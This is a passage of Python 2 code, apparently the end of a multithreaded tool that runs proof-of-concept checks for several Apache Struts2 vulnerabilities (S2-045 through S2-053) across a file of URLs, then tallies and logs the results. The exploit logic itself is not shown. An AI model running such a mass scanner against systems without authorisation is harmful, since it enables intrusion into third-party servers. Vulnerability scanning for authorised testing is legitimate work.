				countlines = len(open(tgtFilepath,'rU').readlines())

				print '===Total ' + str(countlines) + ' urls==='

				for urls in urlsFile:
				
					q0.put(urls)
			
			
				for thread in range(threads):
					t = threading.Thread(target=execpoc,args=(nowtime,))
					t.start()
					threadlist.append(t)
				for th in threadlist:
					th.join()

				result = {'st2-045':s045,'st2-046':s046,'st2-048':s048,'st2-052':s052,'st2-053':s053}
				statistics()
			
			else:	
				parser.print_help()
	

	etime = datetime.datetime.now()
	
	usedtime = (etime - stime).seconds

	logger(nowtime1,operation,result,usedtime)

	print 'Total used ' + str(usedtime) + 's'	

	print '********************************************************************'

	

	

	
	
    
